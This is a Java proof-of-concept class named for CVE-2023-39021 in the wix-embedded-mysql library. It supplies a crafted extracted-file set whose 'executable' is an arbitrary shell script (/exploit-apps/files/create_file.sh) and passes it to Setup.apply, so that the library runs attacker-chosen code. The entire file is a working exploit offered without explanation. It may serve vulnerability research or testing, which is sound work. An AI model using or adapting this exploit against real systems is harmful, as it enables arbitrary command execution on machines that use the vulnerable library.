package com.ampaschal;

import com.wix.mysql.config.MysqldConfig;
import com.wix.mysql.distribution.Setup;
import com.wix.mysql.distribution.Version;
import de.flapdoodle.embed.process.config.IRuntimeConfig;
import de.flapdoodle.embed.process.config.io.ProcessOutput;
import de.flapdoodle.embed.process.config.store.FileType;
import de.flapdoodle.embed.process.extract.IExtractedFileSet;
import de.flapdoodle.embed.process.io.IStreamProcessor;
import de.flapdoodle.embed.process.runtime.ICommandLinePostProcessor;
import de.flapdoodle.embed.process.store.IArtifactStore;

import java.io.File;
import java.io.IOException;
import java.util.Collections;
import java.util.List;

public class Wix_CVE_2023_39021 {

    public static void main(String[] args) {
        IExtractedFileSet set = new IExtractedFileSet() {
            @Override
            public File executable() {
                return new File("/exploit-apps/files/create_file.sh");
            }

            @Override
            public List<File> files(FileType fileType) {
                return Collections.singletonList(new File("/exploit-apps/files/create_file.sh"));
            }

            @Override
            public File baseDir() {
                return null;
            }

            @Override
            public boolean baseDirIsGenerated() {
                return false;
            }
        };
        MysqldConfig.Builder builder = MysqldConfig.aMysqldConfig(Version.v5_7_10);
        IRuntimeConfig configBuilder = getiRuntimeConfig();

        try {
            Setup.apply(builder.build(), set, configBuilder);
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }

    private static IRuntimeConfig getiRuntimeConfig() {
        IStreamProcessor dummyProcessor = new IStreamProcessor() {
            @Override
            public void process(String s) {
            }

            @Override
            public void onProcessed() {
            }
        };
        return new IRuntimeConfig() {
            @Override
            public ProcessOutput getProcessOutput() {
                return new ProcessOutput(dummyProcessor, dummyProcessor, dummyProcessor);
            }

            @Override
            public ICommandLinePostProcessor getCommandLinePostProcessor() {
                return null;
            }

            @Override
            public IArtifactStore getArtifactStore() {
                return null;
            }

            @Override
            public boolean isDaemonProcess() {
                return false;
            }
        };
    }
}
